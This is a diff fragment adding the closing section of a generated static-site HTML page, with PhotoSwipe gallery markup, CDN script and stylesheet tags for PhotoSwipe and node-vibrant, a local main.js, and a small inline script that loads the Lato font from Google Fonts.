+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
